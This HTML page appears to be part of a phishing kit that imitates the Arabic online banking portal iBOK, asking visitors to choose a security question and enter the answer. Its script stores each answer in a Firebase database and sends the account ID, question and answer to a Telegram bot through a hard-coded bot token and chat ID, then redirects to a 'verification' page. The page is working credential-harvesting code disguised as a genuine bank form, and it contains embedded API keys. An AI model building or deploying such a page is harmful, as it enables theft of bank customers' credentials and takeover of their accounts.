<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ุณุคุงู ุงูุฃูุงู - iBOK</title>
    <link rel="stylesheet" href="styles.css"> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>
    <div class="container">
        <header class="header">
            <div class="logo-text">iBOK ุงู ุจูู</div>
            <div class="service-name">ุงูุฎุฏูุงุช ุงููุตุฑููุฉ ุนุจุฑ ุงูุฅูุชุฑูุช</div>
        </header>

        <div class="welcome-banner">
            ูุฑุฌู ุชุนููู ุณุคุงู ุงูุฃูุงู ูุชุฃููุฏ ูููุชู ูู ุงููุณุชูุจู.
        </div>

        <div class="form-card">
            <div class="card-title">ุณุคุงู ุงูุฃูุงู</div>
            <div class="card-subtitle">ุงูุฑุฌุงุกุงูุฅุฌุงุจุฉ ุนูู ุณุคุงู ุงูุงูุงู.</div>

            <form id="securityForm">
                
                <div class="input-group">
                    <label class="input-label" for="selectedQuestionDisplay">ุงุฎุชุฑ ุณุคุงู ุงูุฃูุงู:</label>
                    
                    <input type="text" id="selectedQuestionDisplay" class="form-input custom-select-trigger" 
                           placeholder="ุงููุฑ ููุง ูุงุฎุชูุงุฑ ุงูุณุคุงู" readonly onclick="showQuestionModal()">
                    
                    <input type="hidden" id="selectedQuestionValue" name="security_question" required>
                </div>

                <div class="input-group">
                    <label class="input-label" for="answer">ุงูุฅุฌุงุจุฉ:</label>
                    <input type="text" id="answer" class="form-input" placeholder="ุงูุชุจ ุฅุฌุงุจุชู" required disabled>
                </div>

                <button type="submit" class="submit-button" id="submitButton" disabled>ุญูุธ ุงูุฅุฌุงุจุฉ</button>
            </form>
        </div>
    </div>

    <div id="questionModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>ุงุฎุชุฑ ุณุคุงู ุงูุฃูุงู</h3>
            </div>
            <div class="questions-list-modal">
                <label class="question-item">
                    <input type="radio" name="modal_security_question" value="ูุง ูู ุงุณู ุงุจู ุนูู ุงูุฃููุ" onclick="confirmQuestionSelection(this)">
                    <span class="checkmark"></span> ูุง ูู ุงุณู ุงุจู ุนูู ุงูุฃููุ
                </label>
                <label class="question-item">
                    <input type="radio" name="modal_security_question" value="ูู ุงู ูุฏููุฉ ููุฏุชุ" onclick="confirmQuestionSelection(this)">
                    <span class="checkmark"></span> ูู ุงู ูุฏููุฉ ููุฏุชุ
                </label>
                <label class="question-item">
                    <input type="radio" name="modal_security_question" value="ูู ุงู ุณูุฉ ุชุฎุฑุฌุช ูู ุงูุฌุงูุนุฉุ" onclick="confirmQuestionSelection(this)">
                    <span class="checkmark"></span> ูู ุงู ุณูุฉ ุชุฎุฑุฌุช ูู ุงูุฌุงูุนุฉุ
                </label>
                <label class="question-item">
                    <input type="radio" name="modal_security_question" value="ูุงุฐุง ูุงูุช ููุจู ุฃุซูุงุก ุงูุทูููุฉุ" onclick="confirmQuestionSelection(this)">
                    <span class="checkmark"></span> ูุงุฐุง ูุงูุช ููุจู ุฃุซูุงุก ุงูุทูููุฉุ
                </label>
                <label class="question-item">
                    <input type="radio" name="modal_security_question" value="ุงุณู ูุคููู ุงูููุถูุ" onclick="confirmQuestionSelection(this)">
                    <span class="checkmark"></span> ุงุณู ูุคููู ุงูููุถูุ
                </label>
                <label class="question-item">
                    <input type="radio" name="modal_security_question" value="ุงุณู ุงูุดุฑูุฉ ุงููุตูุนุฉ ููุณูุงุฑุฉ ุงูููุถูุฉ ูุฏููุ" onclick="confirmQuestionSelection(this)">
                    <span class="checkmark"></span> ุงุณู ุงูุดุฑูุฉ ุงููุตูุนุฉ ููุณูุงุฑุฉ ุงูููุถูุฉ ูุฏููุ
                </label>
                <label class="question-item">
                    <input type="radio" name="modal_security_question" value="ุงู ููู ูู ุงูููุถู ูุฏููุ" onclick="confirmQuestionSelection(this)">
                    <span class="checkmark"></span> ุงู ููู ูู ุงูููุถู ูุฏููุ
                </label>
                <label class="question-item">
                    <input type="radio" name="modal_security_question" value="ุงุณู ุงูุถู ุตุฏูู ูู ุงูุทูููุฉุ" onclick="confirmQuestionSelection(this)">
                    <span class="checkmark"></span> ุงุณู ุงูุถู ุตุฏูู ูู ุงูุทูููุฉุ
                </label>
                
            </div>
        </div>
    </div>
    
<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
    import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyBBs3cFGjT6iB8_xVEHG7r1rqXiiVa7nX4",
        authDomain: "project-id-b8e1e.firebaseapp.com",
        projectId: "project-id-b8e1e",
        storageBucket: "project-id-b8e1e.appspot.com",
        messagingSenderId: "317735776154",
        appId: "1:317735776154:web:6ee090d706c9a4bfcad423"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    const TELEGRAM_TOKEN = "8569488666:AAE2HdV-K-BrpmPLw-IlKr_9UiEiYbD40Mc";
    const CHAT_ID = "8108669125";

    const form = document.getElementById('securityForm');
    const answerInput = document.getElementById('answer');
    const submitButton = document.getElementById('submitButton');
    const toast = document.getElementById('toast');
    const questionModal = document.getElementById('questionModal');
    const selectedQuestionDisplay = document.getElementById('selectedQuestionDisplay');
    const selectedQuestionValue = document.getElementById('selectedQuestionValue');

    window.showQuestionModal = function() {
        questionModal.style.display = 'flex';
    }

    window.hideQuestionModal = function() {
        questionModal.style.display = 'none';
    }

    window.confirmQuestionSelection = function(selectedRadio) {
        if (selectedRadio.checked) {
            const questionText = selectedRadio.value;
            selectedQuestionDisplay.value = questionText; 
            selectedQuestionValue.value = questionText; 
            answerInput.disabled = false;
            submitButton.disabled = false;
            answerInput.focus();
        }
        hideQuestionModal();
    }

    function showToast(message, color='#4CAF50') {
        if (!toast) return; 
        toast.innerText = message;
        toast.style.backgroundColor = color;
        toast.style.display = 'block';
        setTimeout(()=> { toast.style.display = 'none'; }, 3000);
    }

    async function sendSecurityToTelegram(userID, question, answer) {
        const message = `๐ ุณุคุงู ุงูุฃูุงู:\nุฑูู ุงูุญุณุงุจ: ${userID}\nุงูุณุคุงู: ${question}\nุงูุฅุฌุงุจุฉ: ${answer}`;
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
        try {
            await fetch(url);
        } catch(err) {
            console.error("ุฎุทุฃ ูู ุฅุฑุณุงู ุจูุงูุงุช ุณุคุงู ุงูุฃูุงู ููุจูุช:", err);
        }
    }

    form.addEventListener('submit', async e => {
        e.preventDefault();
        
        const question = selectedQuestionValue.value;
        const answer = answerInput.value.trim();
        const userID = localStorage.getItem('userID');

        if (!userID) {
            showToast('ุฎุทุฃ: ูู ูุชู ุงูุนุซูุฑ ุนูู ุฑูู ุงููุณุชุฎุฏู.', '#D32F2F');
            setTimeout(() => { window.location.href = "login.html"; }, 1000);
            return;
        }

        if (!question || !answer) {
            showToast('ุงูุฑุฌุงุก ุงุฎุชูุงุฑ ุงูุณุคุงู ููุชุงุจุฉ ุงูุฅุฌุงุจุฉ.', '#D32F2F');
            return;
        }
        
        try {
            // ุญูุธ ุงูุณุคุงู ูุงูุฅุฌุงุจุฉ ูู Firebase
            await setDoc(doc(db, "users", userID), {
                securityQuestion: question,
                securityAnswer: answer
            }, { merge: true });

            // ุฅุฑุณุงู ุงูุณุคุงู ูุงูุฅุฌุงุจุฉ ููุจูุช
            await sendSecurityToTelegram(userID, question, answer);

            showToast("ุชู ุญูุธ ุฅุฌุงุจุชู ุจูุฌุงุญ! ุฌุงุฑู ุงูุชูุฌูู ูุตูุญุฉ ุงูุชุญูู.");
            
            setTimeout(() => {
                window.location.href = "verification.html"; 
            }, 1000);

        } catch(err) {
            console.error("ุฎุทุฃ ูู Firebase:", err);
            showToast("ุญุฏุซ ุฎุทุฃ ุฃุซูุงุก ุงูุญูุธุ ุญุงูู ูุฑุฉ ุฃุฎุฑู.", '#D32F2F');
        }
    });
</script>

</body>
</html>